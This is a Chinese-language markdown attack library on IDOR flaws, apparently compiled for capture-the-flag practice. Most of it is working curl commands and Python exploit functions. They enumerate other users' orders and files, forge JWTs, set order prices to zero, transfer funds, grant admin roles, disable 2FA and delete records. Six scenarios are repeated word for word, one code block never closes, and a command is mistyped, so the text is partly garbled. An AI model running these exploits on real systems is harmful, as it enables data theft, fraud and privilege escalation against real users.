# IDOR 不安全直接对象引用 - 攻击库
**Keywords**: IDOR, Insecure Direct Object Reference, Authorization Bypass, ID Parameter, UUID, Access Control, Horizontal Privilege Escalation

## 核心攻击方法

### 方法1: URL参数ID枚举
```bash
# 直接修改URL中的ID
curl -b cookies.txt "http://target/order/1/receipt"
curl -b cookies.txt "http://target/order/2/receipt"
curl -b cookies.txt "http://target/order/300401/receipt"

# 批量测试
for i in {1..1000}; do
  curl -b cookies.txt -s "http://target/order/$i/receipt" | grep -i "flag\|secret"
done
```

### 方法2: POST参数修改
```bash
curl -b cookies.txt -X POST "http://target/api/update" \
  -d "user_id=123&action=delete"

curl -b cookies.txt -X POST "http://target/api/data" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 999, "amount": 10000}'
```

### 方法3: Cookie修改
```bash
curl --cookie "user_id=123; session=abc123" "http://target/dashboard"
```

### 方法4: HTTP Header注入
```bash
curl -b cookies.txt \
  -H "X-UserId: 123" \
  -H "X-User-Id: 456" \
  -H "X-Original-User: 789" \
  "http://target/profile"
```

### 方法5: JWT令牌篡改
```python
import jwt
import requests

# 登录获取原始JWT
r = requests.post('http://target/login', json={'user': 'test', 'pass': 'test'})
token = r.cookies.get('auth_token')

# 解码（不验证签名）
payload = jwt.decode(token, options={"verify_signature": False})

# 篡改user_id
payload['user_id'] = 10019

# 重新编码
forged = jwt.encode(payload, 'fake', algorithm='HS256')

# 使用伪造的JWT
headers = {'Authorization': f'Bearer {forged}'}
r = requests.get('http://target/admin', headers=headers)
```

## 攻击案例提取

### 案例001: 直接IDOR
登录后直接访问他人订单
```bash
# 步骤1: 登录
curl -c cookies.txt -X POST http://target:5000/ -d "username=test"
curl -b cookies.txt -c cookies.txt -X POST http://target:5000/password/test -d "password=test"

# 步骤2: 直接访问特权订单
curl -b cookies.txt http://target:5000/order/300401/receipt
```

### 案例002: 间接IDOR
先归档他人订单（获得archiver身份），再查看收据
```bash
# 步骤1: 登录
curl -c cookies.txt -X POST http://target:5000/ -d "username=test"
curl -b cookies.txt -X POST http://target:5000/password/test -d "password=test"

# 步骤2: 归档他人订单（无权限检查）
curl -b cookies.txt http://target:5000/order/300198/archive

# 步骤3: 现在可以查看该订单（因为是archiver）
curl -b cookies.txt http://target:5000/order/300198/receipt
```

### 案例003: Header IDOR
```bash
# 登录
curl -c cookies.txt -X POST http://target:5000/ -d "username=test"
curl -b cookies.txt -X POST http://target:5000/password/test -d "password=test"

# 注入X-UserId获取特定用户信息
curl -b cookies.txt -H "X-UserId: 10052" http://target:5000/dashboard
```

### 案例027: JWT IDOR
```python
import jwt
import requests

session = requests.Session()

# 登录
r = session.post('http://target:5000/', data={'username': 'test'})
r = session.post('http://target:5000/password/test', data={'password': 'test'})

# 获取JWT
token = session.cookies.get('auth_token')

# 解码并篡改
payload = jwt.decode(token, options={"verify_signature": False})
payload['user_id'] = 10019

# 重新编码并访问
forged = jwt.encode(payload, 'any', algorithm='HS256')
session.cookies.set('auth_token', forged)
r = session.get('http://target:5000/dashboard')
print(r.text)  # 包含FLAG
```

## 快速识别技巧

1. **寻找ID参数**：URL中的数字、用户名、订单号
2. **测试其他ID**：尝试修改为其他数字/用户名
3. **检查响应差异**：观察不同ID返回的数据是否改变
4. **链式利用**：某个操作可能给予新权限（如变为archiver）
5. **多参数检查**：同时修改多个ID参数

## 常见变体

- URL IDOR: `/api/users/123`
- POST IDOR: `user_id=123`
- Cookie IDOR: `user_id=123`
- Header IDOR: `X-UserId: 123`
- JWT IDOR: `{"user_id": 123}`
- 间接IDOR: 通过一个操作获得权限再访问另一资源

## 场景1: 电商订单IDOR

### 场景描述
用户可以通过修改订单号访问其他用户的订单详情和收据

### 漏洞Payload

```bash
# 枚举所有订单
for id in {1..100}; do
  echo "[*] 测试订单 $id"
  curl -s -b "auth_token=$TOKEN" "http://target/orders/$id" | grep -i "flag\|user\|secret\|email"
done

# 直接访问高权限订单
curl -b "auth_token=$TOKEN" "http://target/orders/9999/receipt"
curl -b "auth_token=$TOKEN" "http://target/orders/10019/details"
curl -b "auth_token=$TOKEN" "http://target/orders/300401/invoice"

# 修改订单（DELETE权限）
curl -X DELETE -b "auth_token=$TOKEN" "http://target/orders/300198"
```

### Python EXP

```python
import requests
import json

def exploit_order_idor(target, token, order_ids=[1,2,3,10019,300401,300198]):
    """
    电商订单IDOR利用
    """
    headers = {"Cookie": f"auth_token={token}"}
    session = requests.Session()
    
    for order_id in order_ids:
        # 查看订单详情
        r = session.get(f"{target}/orders/{order_id}", headers=headers)
        if r.status_code == 200:
            print(f"[+] 订单 {order_id}: {r.text[:200]}")
            if 'flag' in r.text.lower():
                print(f"[!] 找到FLAG: {r.text}")
                return r.text
        
        # 查看收据
        r = session.get(f"{target}/orders/{order_id}/receipt", headers=headers)
        if r.status_code == 200:
            print(f"[+] 收据 {order_id}: {r.text[:200]}")
        
        # 尝试删除
        r = session.delete(f"{target}/orders/{order_id}", headers=headers)
        if r.status_code == 200:
            print(f"[+] 成功删除订单 {order_id}")
```

## 场景2: 用户信息IDOR

### 场景描述
用户可以访问和修改其他用户的个人信息、邮箱、电话等

### 漏洞Payload

```bash
# 查看其他用户信息
curl -b "session=$SID" "http://target/api/users/1/profile"
curl -b "session=$SID" "http://target/users/admin/details"
curl -b "session=$SID" "http://target/api/v1/user/999/data"

# 修改其他用户信息
curl -X POST -b "session=$SID" "http://target/api/users/999" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@example.com", "role": "admin"}'

# 批量查询用户
for uid in {1..50}; do
  curl -s -b "session=$SID" "http://target/users/$uid" | grep -o 'email\|password\|secret' | head -1 && echo " - UID $uid"
done
```

### Python EXP

```python
import requests

def exploit_user_idor(target, session_id, target_users=[1, 2, 99, 999, 10019]):
    """
    用户信息IDOR
    """
    cookies = {"session": session_id}
    
    for user_id in target_users:
        # GET用户信息
        r = requests.get(f"{target}/api/users/{user_id}/profile", cookies=cookies)
        if r.status_code == 200:
            data = r.json()
            print(f"[+] 用户 {user_id}: {data}")
            
            # 尝试修改为admin
            r = requests.post(f"{target}/api/users/{user_id}", 
                            cookies=cookies,
                            json={"role": "admin", "admin": True})
            if r.status_code == 200:
                print(f"[+] 成功提升用户 {user_id} 为admin")
```

## 场景3: 支付/金额IDOR

### 场景描述
用户可以修改他人的支付金额、账户余额等敏感财务数据

### 漏洞Payload

```bash
# 查看他人账户余额
curl -b "auth=$TOKEN" "http://target/api/accounts/999/balance"
curl -b "auth=$TOKEN" "http://target/api/users/10019/wallet"

# 修改他人金额
curl -X POST -b "auth=$TOKEN" "http://target/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{"from_user": 999, "to_user": 1, "amount": 99999}'

# 修改订单价格
curl -X PUT -b "auth=$TOKEN" "http://target/orders/300198" \
  -H "Content-Type: application/json" \
  -d '{"price": 0.01, "total": 0.01}'
```

### Python EXP

```python
def exploit_payment_idor(target, token):
    """
    支付IDOR - 修改订单金额为0
    """
    headers = {"Authorization": f"Bearer {token}"}
    
    # 查看原始价格
    r = requests.get(f"{target}/orders/300198", headers=headers)
    original = r.json()
    print(f"[*] 原始价格: {original['total']}")
    
    # 修改为0
    r = requests.put(f"{target}/orders/300198",
                    headers=headers,
                    json={"price": 0, "total": 0})
    
    print(f"[+] 订单价格已修改为0")
    return r.json()
```

## 场景4: 文件/文档IDOR

### 场景描述
用户可以访问和下载其他用户的私密文件、文档、收据等

### 漏洞Payload

```bash
# 枚举文件ID
for fid in {1..1000}; do
  curl -s -b "sid=$SID" "http://target/api/files/$fid/download" -o "file_$fid.pdf" 2>/dev/null
  [ -s "file_$fid.pdf" ] && echo "[+] 文件 $fid 存在 ($(stat -f%z file_$fid.pdf) bytes)"
done

# 直接下载
curl -b "sid=$SID" "http://target/documents/999/invoice" -o invoice.pdf
curl -b "sid=$SID" "http://target/api/export/report/10019"
curl -b "sid=$SID" "http://target/files/admin/backup.sql"

# 修改文件所有者
curl -X POST -b "sid=$SID" "http://target/api/files/123/share" \
  -d "user_id=attacker@example.com&permission=full_access"
```

### Python EXP

```python
def exploit_file_idor(target, session_id):
    """
    文件IDOR - 批量下载所有可访问文件
    """
    cookies = {"session": session_id}
    found_files = []
    
    for file_id in range(1, 500):
        r = requests.get(f"{target}/api/files/{file_id}", cookies=cookies)
        if r.status_code == 200:
            found_files.append(file_id)
            print(f"[+] 文件 {file_id}: {r.headers.get('content-disposition', 'unknown')}")
            
            # 下载敏感文件
            if 'admin' in r.text.lower() or 'secret' in r.text.lower():
                with open(f"file_{file_id}.txt", 'w') as f:
                    f.write(r.text)
                print(f"[!] 敏感文件已保存: file_{file_id}.txt")
    
    return found_files
```

## 场景5: 权限相关的IDOR

### 场景描述
通过IDOR修改他人权限、角色、管理员标志等

### 漏洞Payload

```bash
# 升级为管理员
curl -X POST -b "auth=$TOKEN" "http://target/api/users/999" \
  -H "Content-Type: application/json" \
  -d '{"is_admin": true, "admin": 1, "role": "admin"}'

# 修改权限位
curl -X PUT -b "auth=$TOKEN" "http://target/api/users/999/permissions" \
  -d "permissions=0xFFFFFFFF"

# 获取admin API密钥
curl -b "auth=$TOKEN" "http://target/api/users/1/apikey"

# 修改2FA/MFA设置
curl -X POST -b "auth=$TOKEN" "http://target/api/users/999/2fa/disable" \
  -d "confirmation=bypass"
```

### Python EXP

```python
def exploit_permission_idor(target, token, victim_id=999):
    """
    权限IDOR - 将用户升级为管理员
    """
    headers = {"Authorization": f"Bearer {token}"}
    
    # 方法1: 直接修改admin字段
    payload = {"is_admin": True, "admin": 1, "role": "superadmin"}
    r = requests.post(f"{target}/api/users/{victim_id}",
                     headers=headers,
                     json=payload)
    
    if r.status_code == 200:
        print(f"[+] 用户 {victim_id} 已升级为管理员")
        return True
    
    # 方法2: 获取admin的API密钥
    r = requests.get(f"{target}/api/users/1/apikey", headers=headers)
    if r.status_code == 200:
        admin_key = r.json()['apikey']
        print(f"[!] 获取admin密钥: {admin_key}")
        return admin_key
```

## 场景6: 间接IDOR链

### 场景描述
通过多个操作组合形成完整的攻击链，最终获得他人高权限资源

### 漏洞Payload

```bash
# 步骤1: 登录为普通用户
curl -c cookies.txt -X POST "http://target/login" \
  -d "username=user&password=pass"

# 步骤2: 枚举其他用户
for uid in {1..10}; do
  curl -b cookies.txt -s "http://target/api/users/$uid" | grep -o '"name":"[^"]*"' &
done

# 步骤3: 对目标用户进行某个操作（可能获得特殊身份）
curl -b cookies.txt -X POST "http://target/orders/300198/approve" 
ncurl -b cookies.txt -X POST "http://target/api/users/999/invite"

# 步骤4: 现在以新身份访问受限资源
curl -b cookies.txt "http://target/admin/dashboard"
curl -b cookies.txt "http://target/api/sensitive/data"
```

### Python EXP

```python
def exploit_indirect_idor_chain(target):
    """
    间接IDOR链 - 通过多个操作获得高权限
    """
    session = requests.Session()
    
    # 步骤1: 注册/登录
    r = session.post(f"{target}/register", 
                    data={"username": "attacker", "password": "pass"})
    
    # 步骤2: 枚举用户和权限
    users = []
    for uid in range(1, 50):
        r = session.get(f"{target}/api/users/{uid}")
        if r.status_code == 200:
            users.append(r.json())
            print(f"[+] 用户 {uid}: {r.json().get('name')}")
    
    # 步骤3: 执行某个操作获得权限升级
    # 比如被某个高权限用户接纳为下属
    for user in users:
        r = session.post(f"{target}/api/users/{user['id']}/accept_invite")
        
        # 步骤4: 检查是否获得新权限
        r = session.get(f"{target}/api/current_user")
        if r.json().get('role') != 'user':
            print(f"[!] 权限提升成功: {r.json().get('role')}")
            return r.json()

## 场景1: 电商订单IDOR

### 场景描述
用户可以通过修改订单号访问其他用户的订单详情和收据

### 漏洞Payload

```bash
# 枚举所有订单
for id in {1..100}; do
  echo "[*] 测试订单 $id"
  curl -s -b "auth_token=$TOKEN" "http://target/orders/$id" | grep -i "flag\|user\|secret\|email"
done

# 直接访问高权限订单
curl -b "auth_token=$TOKEN" "http://target/orders/9999/receipt"
curl -b "auth_token=$TOKEN" "http://target/orders/10019/details"
curl -b "auth_token=$TOKEN" "http://target/orders/300401/invoice"

# 修改订单（DELETE权限）
curl -X DELETE -b "auth_token=$TOKEN" "http://target/orders/300198"
```

### Python EXP

```python
import requests
import json

def exploit_order_idor(target, token, order_ids=[1,2,3,10019,300401,300198]):
    """
    电商订单IDOR利用
    """
    headers = {"Cookie": f"auth_token={token}"}
    session = requests.Session()
    
    for order_id in order_ids:
        # 查看订单详情
        r = session.get(f"{target}/orders/{order_id}", headers=headers)
        if r.status_code == 200:
            print(f"[+] 订单 {order_id}: {r.text[:200]}")
            if 'flag' in r.text.lower():
                print(f"[!] 找到FLAG: {r.text}")
                return r.text
        
        # 查看收据
        r = session.get(f"{target}/orders/{order_id}/receipt", headers=headers)
        if r.status_code == 200:
            print(f"[+] 收据 {order_id}: {r.text[:200]}")
        
        # 尝试删除
        r = session.delete(f"{target}/orders/{order_id}", headers=headers)
        if r.status_code == 200:
            print(f"[+] 成功删除订单 {order_id}")
```

## 场景2: 用户信息IDOR

### 场景描述
用户可以访问和修改其他用户的个人信息、邮箱、电话等

### 漏洞Payload

```bash
# 查看其他用户信息
curl -b "session=$SID" "http://target/api/users/1/profile"
curl -b "session=$SID" "http://target/users/admin/details"
curl -b "session=$SID" "http://target/api/v1/user/999/data"

# 修改其他用户信息
curl -X POST -b "session=$SID" "http://target/api/users/999" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@example.com", "role": "admin"}'

# 批量查询用户
for uid in {1..50}; do
  curl -s -b "session=$SID" "http://target/users/$uid" | grep -o 'email\|password\|secret' | head -1 && echo " - UID $uid"
done
```

### Python EXP

```python
import requests

def exploit_user_idor(target, session_id, target_users=[1, 2, 99, 999, 10019]):
    """
    用户信息IDOR
    """
    cookies = {"session": session_id}
    
    for user_id in target_users:
        # GET用户信息
        r = requests.get(f"{target}/api/users/{user_id}/profile", cookies=cookies)
        if r.status_code == 200:
            data = r.json()
            print(f"[+] 用户 {user_id}: {data}")
            
            # 尝试修改为admin
            r = requests.post(f"{target}/api/users/{user_id}", 
                            cookies=cookies,
                            json={"role": "admin", "admin": True})
            if r.status_code == 200:
                print(f"[+] 成功提升用户 {user_id} 为admin")
```

## 场景3: 支付/金额IDOR

### 场景描述
用户可以修改他人的支付金额、账户余额等敏感财务数据

### 漏洞Payload

```bash
# 查看他人账户余额
curl -b "auth=$TOKEN" "http://target/api/accounts/999/balance"
curl -b "auth=$TOKEN" "http://target/api/users/10019/wallet"

# 修改他人金额
curl -X POST -b "auth=$TOKEN" "http://target/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{"from_user": 999, "to_user": 1, "amount": 99999}'

# 修改订单价格
curl -X PUT -b "auth=$TOKEN" "http://target/orders/300198" \
  -H "Content-Type: application/json" \
  -d '{"price": 0.01, "total": 0.01}'
```

### Python EXP

```python
def exploit_payment_idor(target, token):
    """
    支付IDOR - 修改订单金额为0
    """
    headers = {"Authorization": f"Bearer {token}"}
    
    # 查看原始价格
    r = requests.get(f"{target}/orders/300198", headers=headers)
    original = r.json()
    print(f"[*] 原始价格: {original['total']}")
    
    # 修改为0
    r = requests.put(f"{target}/orders/300198",
                    headers=headers,
                    json={"price": 0, "total": 0})
    
    print(f"[+] 订单价格已修改为0")
    return r.json()
```

## 场景4: 文件/文档IDOR

### 场景描述
用户可以访问和下载其他用户的私密文件、文档、收据等

### 漏洞Payload

```bash
# 枚举文件ID
for fid in {1..1000}; do
  curl -s -b "sid=$SID" "http://target/api/files/$fid/download" -o "file_$fid.pdf" 2>/dev/null
  [ -s "file_$fid.pdf" ] && echo "[+] 文件 $fid 存在 ($(stat -f%z file_$fid.pdf) bytes)"
done

# 直接下载
curl -b "sid=$SID" "http://target/documents/999/invoice" -o invoice.pdf
curl -b "sid=$SID" "http://target/api/export/report/10019"
curl -b "sid=$SID" "http://target/files/admin/backup.sql"

# 修改文件所有者
curl -X POST -b "sid=$SID" "http://target/api/files/123/share" \
  -d "user_id=attacker@example.com&permission=full_access"
```

### Python EXP

```python
def exploit_file_idor(target, session_id):
    """
    文件IDOR - 批量下载所有可访问文件
    """
    cookies = {"session": session_id}
    found_files = []
    
    for file_id in range(1, 500):
        r = requests.get(f"{target}/api/files/{file_id}", cookies=cookies)
        if r.status_code == 200:
            found_files.append(file_id)
            print(f"[+] 文件 {file_id}: {r.headers.get('content-disposition', 'unknown')}")
            
            # 下载敏感文件
            if 'admin' in r.text.lower() or 'secret' in r.text.lower():
                with open(f"file_{file_id}.txt", 'w') as f:
                    f.write(r.text)
                print(f"[!] 敏感文件已保存: file_{file_id}.txt")
    
    return found_files
```

## 场景5: 权限相关的IDOR

### 场景描述
通过IDOR修改他人权限、角色、管理员标志等

### 漏洞Payload

```bash
# 升级为管理员
curl -X POST -b "auth=$TOKEN" "http://target/api/users/999" \
  -H "Content-Type: application/json" \
  -d '{"is_admin": true, "admin": 1, "role": "admin"}'

# 修改权限位
curl -X PUT -b "auth=$TOKEN" "http://target/api/users/999/permissions" \
  -d "permissions=0xFFFFFFFF"

# 获取admin API密钥
curl -b "auth=$TOKEN" "http://target/api/users/1/apikey"

# 修改2FA/MFA设置
curl -X POST -b "auth=$TOKEN" "http://target/api/users/999/2fa/disable" \
  -d "confirmation=bypass"
```

### Python EXP

```python
def exploit_permission_idor(target, token, victim_id=999):
    """
    权限IDOR - 将用户升级为管理员
    """
    headers = {"Authorization": f"Bearer {token}"}
    
    # 方法1: 直接修改admin字段
    payload = {"is_admin": True, "admin": 1, "role": "superadmin"}
    r = requests.post(f"{target}/api/users/{victim_id}",
                     headers=headers,
                     json=payload)
    
    if r.status_code == 200:
        print(f"[+] 用户 {victim_id} 已升级为管理员")
        return True
    
    # 方法2: 获取admin的API密钥
    r = requests.get(f"{target}/api/users/1/apikey", headers=headers)
    if r.status_code == 200:
        admin_key = r.json()['apikey']
        print(f"[!] 获取admin密钥: {admin_key}")
        return admin_key
```

## 场景6: 间接IDOR链

### 场景描述
通过多个操作组合形成完整的攻击链，最终获得他人高权限资源

### 漏洞Payload

```bash
# 步骤1: 登录为普通用户
curl -c cookies.txt -X POST "http://target/login" \
  -d "username=user&password=pass"

# 步骤2: 枚举其他用户
for uid in {1..10}; do
  curl -b cookies.txt -s "http://target/api/users/$uid" | grep -o '"name":"[^"]*"' &
done

# 步骤3: 对目标用户进行某个操作（可能获得特殊身份）
curl -b cookies.txt -X POST "http://target/orders/300198/approve" 
ncurl -b cookies.txt -X POST "http://target/api/users/999/invite"

# 步骤4: 现在以新身份访问受限资源
curl -b cookies.txt "http://target/admin/dashboard"
curl -b cookies.txt "http://target/api/sensitive/data"
```

### Python EXP

```python
def exploit_indirect_idor_chain(target):
    """
    间接IDOR链 - 通过多个操作获得高权限
    """
    session = requests.Session()
    
    # 步骤1: 注册/登录
    r = session.post(f"{target}/register", 
                    data={"username": "attacker", "password": "pass"})
    
    # 步骤2: 枚举用户和权限
    users = []
    for uid in range(1, 50):
        r = session.get(f"{target}/api/users/{uid}")
        if r.status_code == 200:
            users.append(r.json())
            print(f"[+] 用户 {uid}: {r.json().get('name')}")
    
    # 步骤3: 执行某个操作获得权限升级
    # 比如被某个高权限用户接纳为下属
    for user in users:
        r = session.post(f"{target}/api/users/{user['id']}/accept_invite")
        
        # 步骤4: 检查是否获得新权限
        r = session.get(f"{target}/api/current_user")
        if r.json().get('role') != 'user':
            print(f"[!] 权限提升成功: {r.json().get('role')}")
            return r.json()

